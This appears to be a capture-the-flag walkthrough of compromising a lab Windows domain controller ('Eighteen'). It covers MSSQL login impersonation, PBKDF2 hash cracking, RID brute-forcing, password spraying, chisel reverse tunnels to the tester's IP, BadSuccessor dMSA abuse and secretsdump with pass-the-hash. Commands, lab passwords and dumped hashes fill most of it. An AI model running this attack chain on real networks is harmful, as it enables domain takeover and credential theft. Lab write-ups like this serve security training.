Windows: As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!

### Nmap
```
nmap -sV -sC -vv 10.10.11.95

---OUTPUT---
Nmap scan report for 10.10.11.95
Host is up, received echo-reply ttl 127 (0.018s latency).
Scanned at 2025-12-08 11:38:51 EST for 17s
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON          VERSION
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-12-08T23:39:11+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T19:37:59
| Not valid after:  2055-12-07T19:37:59
| MD5:   b800:2008:a6a5:75ec:eb0c:682a:98e0:1213
| SHA-1: e8f3:2fdf:2e56:ed02:d54b:ac94:6b16:9eae:3d2c:c608
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQUGBVJYTpNrZNUCU0v8I/KDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMjA3MTkzNzU5WhgPMjA1NTEyMDcxOTM3NTlaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAM2wWnCE
| rp2Mdugb4kILOBrKVs641L1EHFS7bHmyyDQe8DArqAAJWTqskZ2bt4xwiHQFBXAn
| nkk647/ogpUMI4UBWHNFLWb7y5DmyJlIGcHoF+QpWl2lr4o+uJIlevrKH4ZqMHzE
| uv/2yY9nsfgLNPJ8XqHjmsqIdCCWZWjpduXyWmldkU9jvJQRWqpquUb58v3SieHz
| XoaLE/pzhbhg4GoFsLQKom5d5NMTzIumePntWa0nGHfF6XCunh9jyCxZaVOzgQQP
| IeYg/85DV5aJdW3ouTC2Q+ZL4wbeTyykjeGk+H80CoLnDHRZSe6umzXSP62jt12X
| QFA88k7aUGacDSivbrMUJoXT9nxGimd98sZ1S9ve1QJD56iFo/9OrrSKm5jSI2LC
| sERuwmbzG9RhiU2H/G75+IIlI7Glday1DXvt8+wvrCEiJ+rAkSrZpPrW5/wM3a2Z
| 9r19LEC4eHCtTYHHExMuwuZ/YD8JuSYTjjDEugQZoCPoMyQoajs8fSMcUQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQATmV1/yrVH0vze13EvUxkbF0vQJS8BNSaUOQX2
| JReomC5OpvOrOnlU2PNlJRvNL4UeYCQMB5mK8I8+tQ4U6gQZ+vmlu7zWrVKlzB27
| 1w+COIL3rrTZk2u8MEbpMpyNbmasn8zIWUvtLmMUffCkKS4//vDP8TSaANp/VGB7
| 8Ryf21QQT1owEsFKV6jxC3phnYM7Voz4+HDIRSJFtRqb5/EwdCG9iAjTH6gBtd1B
| Se6YOt70QLeBw6y8jByJ+0YHFWM+Sg5WG275QrdSqA43+FCc1Q8KUMAbnxoHy0q6
| ip9ioHRqS0xZ3qLeq+udbN0dH4Q9GUS/T8ovGX8jMnCmwAkMka7rp/3W/Xyxu+3T
| BOWk9GEJWqSFwbnACBOYjCT91+ZYgM59TQW8A6SToRY9iWv3GOqZzHunHcBjB0ao
| QFQG9HmOnDcKs49HhreVlgnRdSCe4PArKee0wg9glUM/60NYf3+8l8PzuPEv+7yM
| yIyLUP4oRMa1v4Exr4+mDGq31h8=
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
5985/tcp open  http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02
```
![[Pasted image 20251208114057.png]]

- I can mssql into the target but cant execute many commands. I do find a database `financial_planner`
- I create a new account on the website `test:test` and login:
![[Pasted image 20251208114712.png]]
![[Pasted image 20251208114728.png]]

- Cant access admin dashboard with this account:
![[Pasted image 20251208114759.png]]

- Going to mysql I can connect with the given credentials and these commands provide me the current user, the database names and the users in the mssql environment:
```
impacket-mssqlclient kevin@eighteen.htb

> select user_name();

> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```
![[Pasted image 20251208134122.png]]
- I can also list the databases:
```
SELECT name FROM sys.databases;
```
![[Pasted image 20251208134456.png]]
- However I don't have permissions to see `financial_planner`
- I can pass the `exec_as_login` command to run as user `appdev`
```
exec_as_login appdev
```
![[Pasted image 20251208134310.png]]

- Using `appdev` I can access financial planner:
```
SELECT * FROM financial_planner.information_schema.tables;
SELECT * FROM financial_planner.dbo.users;

---OUTPUT-1---
TABLE_CATALOG       TABLE_SCHEMA   TABLE_NAME    TABLE_TYPE   
-----------------   ------------   -----------   ----------   
financial_planner   dbo            users         b'BASE TABLE'   

financial_planner   dbo            incomes       b'BASE TABLE'   

financial_planner   dbo            expenses      b'BASE TABLE'   

financial_planner   dbo            allocations   b'BASE TABLE'   

financial_planner   dbo            analytics     b'BASE TABLE'   

financial_planner   dbo            visits        b'BASE TABLE'

---OUTPUT-2---
d   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```

- I get the hash of user `admin`. 
- This is an unusual hash. Looking online I find : https://hashcat.net/forum/thread-7854.html
- I can create the right format by first passing the following command (i changed the hash format a bit to match the one in the link):
```bash
echo '$pbkdf2-sha256$600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | gawk '{sub(/^.*-/,"")}$1=$1' FS=\$ OFS=:

---OUTPUT---
sha256:600000:AMtzteQIG7yAbZIa:0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```
- Secondly, as said in that thread in the link, the salted string and  digest needs to be b64 encoded which I do with the following commands:
```
echo 'AMtzteQIG7yAbZIa' | base64
echo -n '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | xxd -r -p | base64

---OUTPUT-1---
QU10enRlUUlHN3lBYlpJYQo=

---OUTPUT-2---
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```
- The first one was in the salted ascii so we converted directly. The second one was a hex digest so we needed to pass `xxd -r -p` before converting to b64
- I then replaced it to form the hash in the right format:
```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

- I crack it with hashcat:
```
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt -a 0 --force


---RELEVANT-OUTPUT---
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
```
![[Pasted image 20251208135741.png]]

- I can login to the website with `admin:iloveyou1` but there is nothing there.

- I also grabbed all the users using nxc rid bruteforce:
```
nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute 10000 --local-auth

---RELEVANT-OUTPUT---
MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
```

- I manually tried each username with the recovered password using winrm and got a hit for user `adam.scott`
```
evil-winrm -u 'adam.scott' -p 'iloveyou1' -i 10.10.11.95
```
![[Pasted image 20251208135935.png]]

- I grab user flag:
![[Pasted image 20251208135954.png]]

- If we check winpeas we see the windows build version is vulnerable dmsa vulnerability
- Using rubeus and getST we could impersonate admin and get hash
- Also port 88 for kerberos is hosted internally so we need to use chisel:
```
chisel server -p 9001 --reverse
.\chisel.exe client 10.10.14.21:9001 R:88:127.0.0.1:88
chisel.exe client 10.10.14.21:9001 R:socks
```

- I upload the following files to the target
	- chisel : to connect to port 88 which is kerberos tht is hosted internally (didnt show up in nmap scans)
	- Rubeus.exe (optional) : to generate a ticket as `adam.scott` which is then used to get the Administrator ticket impersonating the new service we will create
	- SharpSuccessor.exe : https://github.com/logangoins/SharpSuccessor to build the delegated managed service linked to the Administrator
- After forwarding the internal port to my machine using chisel, I can then grab `adam.scott`'s ticket with either `impcaket-getTGT` or `Rubeus.exe`
```
proxychains faketime '+7hours' impacket-getTGT -dc-ip 10.10.11.95 'eighteen.htb/adam.scott:iloveyou1'

---OUTPUT---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
[*] Saving ticket in adam.scott.ccache
```

![[Pasted image 20251209084644.png]]
- Alternatively I can use the following command to generate a ticket with Rubeus:
```
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /enctype:aes256 /nowrap /outfile:scott.b64
```

- I export the ticket to `KRB5CCNAME`. 
```
export KRB5CCNAME=./adam.scott.ccache
```
- If I used Rubeus I need to decode the b64 ticket and use ticketconverter to convert it to a ccache:
```
cat scott.b64 | base64 -d > scott.kirbi #once it was converted already but this is the norm
impacket-ticketConverter scott.b64 scott.ccache

# then export with the command from previous step
```
- Before the next step I need to find a vulnerable OU path for it. This can be done with the ps1 executable I find that checks for BadSuccessor:https://github.com/akamai/BadSuccessor
![[Pasted image 20251209125525.png]]
- Then on the target, I generate the delegated service using SharpSuccessor:
```
.\SharpSuccessor.exe add /impersonate:Administrator /path:”ou=Staff,DC=eighteen,dc=htb” /account:adam.scott /name:newdMSA


---OUTPUT----
   _____ _                      _____
  / ____| |                    / ____|
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
                         | |
                         |_|
@_logangoins

[+] Adding dnshostname newdMSA.eighteen.htb
[+] Adding samaccountname newdMSA$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=newdMSA' in 'ou=Staff,DC=eighteen,dc=htb'
[+] Successfully weaponized dMSA object
[+] Found target account, attempting to write attributes
[+] CN=newdMSA,OU=Staff,DC=eighteen,DC=htb written to Administrator object
[+] msDS-SupersededServiceAccountState set to 2
[!] Exception: Access is denied.
```
![[Pasted image 20251209085056.png]]
![[Pasted image 20251209085108.png]]
- I can check if it's created with the command:
```
Get-ADServiceAccount -Filter * | Select Name,SamAccountName


---OUTPUT---
Name    SamAccountName
----    --------------
newdMSA newdMSA$
```

- I can then impersonate this service as `adam.scott` to get a ccache ticket for Administrator (as the service is linked to it) using `impacket-getST` command:
```
proxychains faketime '+7hours' impacket-getST -impersonate 'newdMSA$' -dmsa -k -no-pass eighteen.htb/adam.scott -self

---OUTPUT---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating newdMSA$
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:8a8e36d6c7c79273de9be64fc86ae6e2f30a6fae4878a32bdd1ed62585762a1e
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:c5c1fad0e79fed0f60f962acb075020d
[*] EncryptionTypes.rc4_hmac:8f396a19f0d28fc0d92836317c5e777f
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in newdMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```
![[Pasted image 20251209084713.png]]
- I change the ticket name to `newdMSA.ccache` just to avoid any errors when exporting and then export it to `KRB5CCNAME`
```
mv newdMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache newdMSA.ccache
export KRB5CCNAME=./newdMSA.ccache
```


- Finally I dump the hashes using this ticket as it authenticates me with administrator privielges:
```
proxychains faketime '+7hours' impacket-secretsdump -k -no-pass dc01.eighteen.htb -just-dc-user Administrator

---OUTPUT---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:49680  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```
![[Pasted image 20251209084541.png]]
- Using this I can pass the hash and login using `evil-winrm` as `Administrator`
```
evil-winrm -u 'Administrator' -H '0b133be956bfaddf9cea56701affddec' -i 10.10.11.95
```
![[Pasted image 20251209084520.png]]

- I grab the root flag:
![[Pasted image 20251209084504.png]]